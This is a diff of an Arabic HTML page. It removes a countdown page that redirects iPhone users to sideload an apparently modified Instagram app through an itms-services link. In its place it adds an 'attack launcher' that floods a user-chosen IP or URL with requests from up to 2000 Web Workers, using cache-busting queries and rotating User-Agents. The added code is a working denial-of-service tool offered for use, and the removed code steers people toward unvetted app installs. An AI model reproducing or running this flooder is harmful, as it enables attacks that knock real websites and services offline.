@@ -1,76 +1,123 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#000000">
-<title>آنستقرام MRX</title>
-<style>
-￼ {
-box-sizing: border-box;
-}
-body {
-margin: 0;
-min-height: 100vh;
-background: #000;
-color: #fff;
-font-family: Arial, sans-serif;
-display: flex;
-align-items: center;
-justify-content: center;
-}
-main {
-text-align: center;
-}
-.logo {
-font-size: 23px;
-font-weight: 900;
-letter-spacing: 4px;
-margin-bottom: 13px;
-}
-.status {
-font-size: 14px;
-font-weight: 700;
-letter-spacing: 2px;
-animation: blink 1.4s infinite;
-}
-@keyframes blink {
-0%, 100% {
-opacity: 1;
-text-shadow: 0 0 12px #fff;
-}
-50% {
-opacity: 0;
-text-shadow: none;
-}
-}
-a {
-color: inherit;
-text-decoration: none;
-}
-</style>
+    <meta charset="UTF-8">
+    <title>هجوم - مشغل هجمات</title>
+    <style>
+        body { background: #0a0a0a; color: #0f0; font-family: Arial; text-align: center; padding: 20px; }
+        input, select, button { background: #1a1a1a; color: #0f0; border: 1px solid #0f0; padding: 10px; margin: 5px; font-size: 16px; border-radius: 5px; }
+        button { background: #0a0; cursor: pointer; font-weight: bold; }
+        button:hover { background: #0f0; color: #000; }
+        #log { background: #000; border: 1px solid #0f0; height: 300px; overflow-y: scroll; text-align: left; padding: 10px; font-size: 12px; margin-top: 10px; }
+        .red { color: #f00; }
+        .green { color: #0f0; }
+    </style>
 </head>
 <body>
-<main>
-<div class="logo">آنستقرام MRX</div>
-<a href="itms-services://?action=download-manifest&url=https://ipa.ipasign.cc/manifest/5cdaf3f731c7.plist" id="install">
-<div class="status" id="status-text">جاري الانتظار... (3)</div>
-</a>
-</main>
-<script>
-const installUrl = "itms-services://?action=download-manifest&url=https://ipa.ipasign.cc/manifest/5cdaf3f731c7.plist";
-let timeLeft = 3;
-const statusText = document.getElementById("status-text");
-const countdown = setInterval(() => {
-timeLeft--;
-if (timeLeft > 0) {
-statusText.textContent = ⁠جاري الانتظار... (${timeLeft})⁠;
-} else {
-clearInterval(countdown);
-statusText.textContent = "يتم التثبيت الآن...";
-window.location.href = installUrl;
-}
-}, 1000);
-</script>
+    <h1>🔥 مشغل الهجمات 🔥</h1>
+    <select id="mode">
+        <option value="ip">هجوم على IP</option>
+        <option value="url">هجوم على URL</option>
+    </select>
+    <input type="text" id="target" placeholder="الهدف: IP:PORT أو URL">
+    <input type="number" id="duration" value="30" placeholder="المدة (ثواني)" min="1">
+    <input type="number" id="threads" value="500" placeholder="عدد الثريدات" min="10" max="2000">
+    <button onclick="startAttack()">🚀 ابدأ الهجوم</button>
+    <button onclick="stopAttack()" class="red">⛔ إيقاف</button>
+    <div id="status"></div>
+    <div id="log"></div>
+
+    <script>
+        let running = false;
+        let workers = [];
+
+        function log(msg, color = 'green') {
+            const div = document.getElementById('log');
+            div.innerHTML += `<span style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</span><br>`;
+            div.scrollTop = div.scrollHeight;
+        }
+
+        function startAttack() {
+            if (running) { log('الهجوم شغال بالفعل!', 'red'); return; }
+            
+            const mode = document.getElementById('mode').value;
+            const target = document.getElementById('target').value;
+            const duration = parseInt(document.getElementById('duration').value);
+            const threadCount = parseInt(document.getElementById('threads').value);
+
+            if (!target) { log('حط هدف أولاً!', 'red'); return; }
+
+            running = true;
+            document.getElementById('status').innerHTML = `🚀 الهجوم شغال على ${target} - ${threadCount} ثريد - ${duration} ثانية`;
+            log(`بدء الهجوم على ${target} بـ ${threadCount} ثريد`, 'green');
+
+           
+            for (let i = 0; i < threadCount; i++) {
+                const worker = new Worker(URL.createObjectURL(new Blob([`
+                    self.onmessage = function(e) {
+                        const { mode, target, duration, workerId } = e.data;
+                        const end = Date.now() + (duration * 1000);
+                        
+                        while (Date.now() < end) {
+                            try {
+                                if (mode === 'ip') {
+                                
+                                    const [ip, port] = target.split(':');
+                                    fetch('http://' + target + '/?' + Math.random(), {
+                                        mode: 'no-cors',
+                                        cache: 'no-store',
+                                        keepalive: true
+                                    }).catch(() => {});
+                                    
+                                  
+                                    fetch('https://' + target + '/?' + Math.random(), {
+                                        mode: 'no-cors',
+                                        cache: 'no-store',
+                                        keepalive: true
+                                    }).catch(() => {});
+                                } else {
+                                    
+                                    fetch(target + '?' + Math.random(), {
+                                        mode: 'no-cors',
+                                        cache: 'no-store',
+                                        keepalive: true,
+                                        headers: {
+                                            'User-Agent': ['Mozilla/5.0', 'Chrome/120', 'Safari/537.36'][Math.floor(Math.random()*3)]
+                                        }
+                                    }).catch(() => {});
+                                    
+                                 
+                                    const xhr = new XMLHttpRequest();
+                                    xhr.open('GET', target + '?x=' + Math.random(), true);
+                                    xhr.send();
+                                }
+                            } catch(e) {}
+                        }
+                        self.postMessage('done');
+                    };
+                `], { type: 'application/javascript' })));
+
+                worker.onmessage = function() {
+                    workers = workers.filter(w => w !== worker);
+                };
+
+                worker.postMessage({ mode, target, duration, workerId: i });
+                workers.push(worker);
+            }
+
+       
+            setTimeout(() => {
+                if (running) stopAttack();
+            }, duration * 1000);
+        }
+
+        function stopAttack() {
+            running = false;
+            workers.forEach(w => w.terminate());
+            workers = [];
+            document.getElementById('status').innerHTML = '⛔ الهجوم متوقف';
+            log('تم إيقاف الهجوم', 'red');
+        }
+    </script>
 </body>
 </html>
